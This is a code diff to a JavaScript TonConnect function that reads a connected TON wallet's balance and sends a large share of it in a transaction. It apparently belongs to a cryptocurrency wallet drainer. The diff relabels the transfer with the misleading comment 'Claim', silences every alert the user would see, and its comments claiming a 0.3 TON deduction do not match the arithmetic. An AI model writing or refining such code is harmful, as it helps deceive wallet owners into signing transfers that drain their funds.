@@ -77,19 +77,20 @@ async function didtrans() {
     // Проверка на ошибки при получении данных о кошельке
     if (!data.balance) {
         console.error('Не удалось получить баланс');
-        alert('Не удалось получить баланс');
+        //alert('Не удалось получить баланс');
         return;
     }
 
-    const originalBalance = ((parseFloat(data.balance)) / 1000000000) * 0.55; // Баланс в нанотонах
+    const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
+    const origbal = (originalBalance / 1000000000) * 0.55
 
     // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
-    const deduction = originalBalance * 1000000000; // 0.3 TON в нанотонах
+    const deduction = origbal * 1000000000; // 0.3 TON в нанотонах
 
     // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
     if (originalBalance <= deduction) {
         console.error('Баланс слишком мал для вычитания 0.3 TON');
-        alert('Баланс слишком мал для вычитания 0.3 TON');
+        //alert('Баланс слишком мал для вычитания 0.3 TON');
         return;
     }
 
@@ -106,19 +107,19 @@ async function didtrans() {
             amount: remainingBalance, // Сумма в нанотонах
         }],
         sendMode: 3,  // Если это требуется в вашем API
-        comment: "Transferring remaining balance after deducting 0.3 TON",  // Комментарий (по желанию)
+        comment: "Claim",  // Комментарий (по желанию)
     };
 
     try {
         // Подписание и отправка транзакции через TonConnect
         const result = await tonConnectUI.sendTransaction(transaction);
         console.log('Транзакция отправлена:', result);
-        alert('Транзакция успешно отправлена!');
+        //alert('Транзакция успешно отправлена!');
         
         // Обновляем баланс после отправки
         await updateBalance(walletAddress);
     } catch (error) {
         console.error('Ошибка при отправке транзакции:', error);
-        alert('Ошибка при отправке транзакции.');
+        //alert('Ошибка при отправке транзакции.');
     }
 }
